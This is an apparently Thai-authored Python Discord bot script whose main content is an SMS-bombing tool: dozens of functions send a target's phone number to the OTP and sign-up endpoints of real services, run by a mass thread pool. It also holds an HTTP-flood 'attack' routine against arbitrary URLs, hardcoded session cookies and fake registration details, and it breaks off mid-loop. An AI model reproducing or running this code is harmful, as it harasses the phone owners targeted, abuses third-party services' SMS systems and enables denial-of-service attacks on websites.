# ทำไมเป็น DMผมมาได้ครับ ชื่อalow_z UID 1181316153478479883

# Modules importation
import nextcord
import json
from nextcord.ext import commands
from nextcord import Interaction, ButtonStyle, Embed
from nextcord.ui import View
import asyncio
import discord
import requests
from colorama import init ,Fore ,Style 
blue =Fore .BLUE +Style .BRIGHT 
from re import search
from requests import post, Session
from datetime import datetime, timedelta
from nextcord import Activity, ActivityType, Status
import itertools
from concurrent.futures import ThreadPoolExecutor
from string import ascii_uppercase, digits
from random import choice
import datetime
from datetime import datetime, timedelta
import os
from re import match
import urllib.request
from user_agent import generate_user_agent
import aiohttp
from nextcord import File
# DONT DELETE ANY MODULES THESE MODULES NEEDED

# CONFIG HELP COMMAND
COMMAND_NSFW = 'nsfw_setup'
COMMAND_SAVROLE = 'saverole_setup'
COMMAND_VERIFY = 'verify_setup'
COMMAND_WEBHOOK = 'webhook_setup'
COMMAND_UPTIME = 'uptime'
COMMAND_REDEEM = 'redeem'
COMMAND_CHECK = 'check_time'
COMMAND_ATTACK = 'attack_setup'

# เซฟยศ config    
name = "alow_z" #ชื่อของแอดมิน | English : ur discord username
log_channel_id = 0 #ช่องเซฟยศ log | English : log save role channel

# SMS SPAM config
PREFIX = '.' 
LIMIT = 2 # จำนวน 
blacklist = ['191,11,00'] # เบอร์ที่ต้องการจะไม่ให้ยิง

# Verify config
WEBHOOK_URL = "" #ur webhook 
ROLE_ID = 0 #ยศยืนยันตัวตน | English : verify role
BUTTON_NAME = "ยืนยันตัวตน" 

# EMBED IMAGE
Images = ""

# ช่องที่ต้องการให้บอร์ดเขา | English : Join Vc config
Guild_ID = 1067449953376534569  # if vc error go to line 625, and change Guild_ID to your server id, and Vc_ID to vc channel id
Vc_ID = 1067449954014072965

# config แจ้งเตือนออนบอท
channel_id = 0 

# Webhook Spam
cooldown = '10'  

# Config Status
Name_status = "พร้อมใช้งาน 💚"
Twitch_url = "https://www.twitch.tv/mastersamaZ"

# TIME AND DATE
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def attack1(target):
    cf = cfscraper.create_scraper()
    cf.get(target)
    cf.post(target)

def attack2(target):
    url = urllib.request.Request(target, headers={'User-Agent': generate_user_agent()})
    urllib.request.urlopen(url)

def attack3(target):
    requests.get(target)

def attack4(target):
    requests.post(target)

def attack5(target):
    requests.head(target)

def run(a,b):
    for _ in range(int(b)):
        threading.Thread(target=attack1, args=[a]).start()
        threading.Thread(target=attack2, args=[a]).start()
        threading.Thread(target=attack3, args=[a]).start()
        threading.Thread(target=attack4, args=[a]).start()
        threading.Thread(target=attack5, args=[a]).start()
           

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

threading = ThreadPoolExecutor(max_workers=int(100000))
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, help_command=None, intents=intents)

class aclient(commands.Bot):
    def __init__(self): 
        super().__init__(command_prefix=commands.when_mentioned_or(PREFIX), intents=discord.Intents().all())
        self.role = None

message_data = {
    "embeds": [
        {
            "title": "",
            "description": "**สถานะการทํางาน**\n```บอททำงานปกติ 🟢```\n\n**บอทพัฒนาโดย**\n<@1181316153478479883>",
            "color": 0xfff9ff,
            "image": {
                "url": ""
            }
        }
    ]
}
url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
headers = {
    "Authorization": f"Bot {os.environ['token']}",
    "Content-Type": "application/json"
}

response = requests.post(url, data=json.dumps(message_data), headers=headers)

if response.status_code == 200:
    print("Online")
else:
    print(f"Error: {response.status_code} - {response.text}")

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

class TerminalColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# API SMS SPAM
#52 api
def sk1(phone):
    post("https://cognito-idp.ap-southeast-1.amazonaws.com/",
        headers={
            "cache-control": "max-age=0",
            'useragent' :  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            "content-type": "application/x-amz-json-1.1",
            "x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode",
            "x-amz-user-agent": "aws-amplify/0.1.x js",
            "referer": "https://www.bugaboo.tv/members/resetpass/phone",
        },
        json={"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{phone[1:]}"},
    )

def sk2(phone):
    post(

        "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",

        headers={"User-Agent": useragent},

        json={"on": {"value": phone, "country": "66"}, "type": "mobile"},

    ) 
    
def sk3(phone):
    post("https://www.theconcert.com/rest/request-otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","cookie": "lang=th;_pbjs_userid_consent_data=3524755945110770;_gcl_au=1.1.1464936573.1671204510;_gid=GA1.2.521817435.1671204510;_gat_UA-133219660-2=1;_fbp=fb.1.1671204510552.293496193;__gads=ID=4f53f92d90f14e3b-22b5f219eed800b9:T=1671204514:RT=1671204514:S=ALNI_MbhYBo5Conm5a9KPhLCLQzdoYslHw;__gpi=UID=00000b91f73b5ed1:T=1671204514:RT=1671204514:S=ALNI_MYo815ZzoPUThss61W0NSqU6Zx5kA;_ga=GA1.1.1714484015.1671204510;_ga_N9T2LF0PJ1=GS1.1.1671204510.1.1.1671204541.0.0.0;adonis-session=cb673f508955dcf6b8246de604839e44rBlxF5AbxNaY%2B8Cq72gSdtAR%2BtBgHyhMtillRc9eBJ5ZOQH6DjXlSJpZQejUO6IenLA1umsiGtankI2cnDxhKQOfrbBDQpu7jQecLv4AjkXB6cfh%2F5zyOhxaljNTGKSw;XSRF-TOKEN=0e82a4759c6fe992966458d638fa3fcaUbV8tu%2FauRE6uMQT3BVHSXuwYyehcery96YZaR3xCEO4DKS5sYAniQlcXHir1XjPUrVkv%2FzK1QAnwR%2FDBw9ubQniyugHdRhBE6JYZLDd8xBz%2FYVyyQ112nb62JjfY6aV"},json={"mobile":f"{phone}","country_code":"TH","lang":"th","channel":"sms","digit":4})
    

def sk4(phone):
    post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"}, data={"mobile_phone_no":phone})

def sk5(phone):
    post(
        "https://api2.1112.com/api/v1/otp/create",
        json={"phonenumber": f"{phone}", "language": "th"},
        headers={
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        },
    )

def ab1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})

def ab2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def ab3(phone):
    post("https://www.fox888.com/api/otp/register", data = f"applicant={phone}&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def ab4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def ab5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ab6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"{phone[1:]}","password":"","client":"ecommerce"})

def ab7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})

def ab8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"{phone[1:]}"})

def ab9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})

def ab10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})

def ab11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})

def ab12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"{phone[1:]}"})

def ab13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

def ab14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def ab15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

def ab16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def ab17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})

def ab18(phone):
    post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def ab19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})

def ab20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"{phone[1:]}"})

def ab21(phone):
    post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})

def ab22(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW", data=f"msisdn={phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ab23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"})

def ab24(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ab25(phone):
    post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab26(phone):
    post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab27(phone):
    post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})

def ab28(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab29(phone):
    post("https://www.homepro.co.th/service/user/profile/otp.jsp", data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"})

def ab30(phone):
    post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})

def ab31(phone):
    post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab32(phone):
    post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab33(phone):
    post("https://findclone.ru/register?phone={phone}")

def ab34(phone):
    post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile":f"{phone}"})

def ab35(phone):
    post("https://api.dgashopqr.morchana.in.th/logins", headers={"User-Agent": useragent}, data={"phone": phone})

def ab36(phone):
    post("https://taxi.yandex.kz/3.0/launch/", data = {'phone': f"{phone}"})

def ab37(phone):
    post("https://api.baccaratth.com/api/v1/sendotp", data = {'phone_number': f"{phone}"})

def ab38(phone):
    send = Session()
    send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")

def ab39(phone):
    post(f"https://www.konglor888.com/api/otp/register", data=f'applicant={phone}&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })

def ab40(phone):
            post(f"https://api.ufaz88regis.com/api/getOtp", data=f'phone={phone}&aff_link=1%24abWbahhDXS1', headers={ 
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '41',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67'
    })

def ab41(phone):
    post("https://nuubi.herokuapp.com/api/spam/alodok", data = {'number': f"{phone}"})

def ab42(phone):
    post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data = {'cellphone': f"{phone}"})

def ab43(phone):
    post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data = {'phone': f"{phone}"})

def ab44(phone):
    post("https://discord.com/api/v9/auth/register/phone",headers={"Host": "discord.com","user-agent":"Discord-Android/105013","cookie":"__sdcfduid=608d2eac694211ec997a42010a0a0a4cd23801e46be73b7cba2279670205f0eb934ffd2384782ecb8a365045135a8998; __dcfduid=608d2eac694211ec997a42010a0a0a4c"},json={"phone":"+66"+phone})

def ab45(phone):
    post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})

def ab46(phone):
    post("https://topping.truemoveh.com/api/get_request_otp",headers={"Host": "topping.truemoveh.com","Accept":"application/json, text/plain, */*","cookie":"ci_session=frg153b1565dsuk4a8j55ile0902e8u2; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7863332B6DE108B97A74D16825A56218B56313DF605583F8CFFAC1507ED9FF78442B7C5D94C36D821689BAE3CE4EC4F5C66C3BEDE3A956835803CB9788CEEC93509; _gcl_au=1.1.464540432.1641184005; _ga=GA1.2.1183136403.1641184006; _gid=GA1.2.76253869.1641184006; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A98%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=c9b4000d-9f83-4aab-84a0-b85d22625f97; _fbp=fb.1.1641184007759.1727343609; wisepops_visits=%5B%222022-01-03T04%3A29%3A31.442Z%22%2C%222022-01-03T04%3A26%3A45.335Z%22%5D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; hPack_mbno=BbcI6g6x7hKHnTiL6HXixjC98Jf0SGbV6RcIB2YXt6i7BMLlXVlN14AiyGDjVKswHjmfv6kQ43NpuAPx%2FF5SsQ%3D%3D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-03T04%3A29%3A31.442Z%22%2C%22mtime%22%3A1641184218938%2C%22pageviews%22%3A5%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%7D%2C%22testIp%22%3Anull%7D","Referer":"https://topping.truemoveh.com/otp","User-Agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36"},data={"mobile_number": phone})

def ab47(phone):
	headers = {
	    "content-type": "application/x-www-form-urlencoded",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
	    "cookie": "_gcl_au=1.1.1123274548.1637746846"
	    }
	post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")

def ab48(phone):
	post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={'username': f"{phone}"})

def ab49(phone):
	post("https://www.msport1688.com/auth/send_otp", data={'phone': f"{phone}"})

def ab50(phone):
	post("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",data=f"method=wpRegisterotp&otp_tel={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "PHPSESSID=vtacuje1no166kkp4d40nolak5"})

def ab51(phone):
	post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")    
 
def ab52(phone):
	post(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")
  
def startall(phone, amount):
    for _ in range(amount):       
        threading.submit(sk1, phone)
        threading.submit(sk2, phone)
        threading.submit(sk3, phone)
        threading.submit(sk4, phone)
        threading.submit(sk5, phone)
        threading.submit(ab1, phone)
        threading.submit(ab2, phone)
        threading.submit(ab3, phone)
        threading.submit(ab4, phone)
        threading.submit(ab5, phone)
        threading.submit(ab6, phone)
        threading.submit(ab7, phone)
        threading.submit(ab8, phone)
        threading.submit(ab9, phone)
        threading.submit(ab10, phone)
